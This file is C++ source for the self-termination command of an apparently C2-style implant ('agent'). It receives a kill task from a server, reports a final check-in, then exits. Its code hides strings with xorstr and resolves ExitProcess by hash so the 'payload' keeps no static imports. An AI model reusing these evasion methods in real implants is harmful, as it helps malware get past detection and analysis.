// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32

#include "agent/commands/exec/exit.h"

#include <Windows.h>

#include <atomic>

#include "agent/util/api_resolver.h"
#include "xorstr/xorstr.hpp"

// KAN-40 ("Exit (terminates the agent)"): the server queues the task as TaskType.KILL = 2 through
// POST /api/v1/commands/{agentID}/execute/kill with an empty KillAgentDTO. The legacy line called
// ExitProcess(0) straight from the command, which loses the task result; here the command records the
// request and Agent::Start delivers the result with one final check-in before exiting.

namespace agent::commands::exec {

    namespace {

        std::atomic<bool> g_exit_requested{false};

    }  // namespace

    CommandResult RequestAgentExit(const models::CheckinResponse& task) {
        (void)task;
        // The flag is set before the result is stored, so the loop cannot miss it: it stores the result
        // and then checks the flag, so the success below is the last thing the server hears from us.
        g_exit_requested.store(true);
        const std::string first{xorstr_("Agent exit requested; the result of this task is reported")};
        return CommandResult::Ok(first + xorstr_(" with one final check-in before the process ends"));
    }

    bool AgentExitRequested() { return g_exit_requested.load(); }

    void ExitAgentProcess() {
        // Resolved by hash like every other Win32 call, so the payload keeps no static import for it.
        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        if (kernel32 != nullptr) {
            const auto exit_process =
                agent::util::resolve_api<decltype(&ExitProcess)>(kernel32, xorstr_("ExitProcess"));
            if (exit_process != nullptr) {
                exit_process(0);
            }
        }
        // Unreachable unless the resolution failed; a task that asked for an exit must still end the
        // process rather than leaving an agent alive that reported its own death.
        ::ExitProcess(0);
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
// ========================================== { END OF FILE } ========================================== //
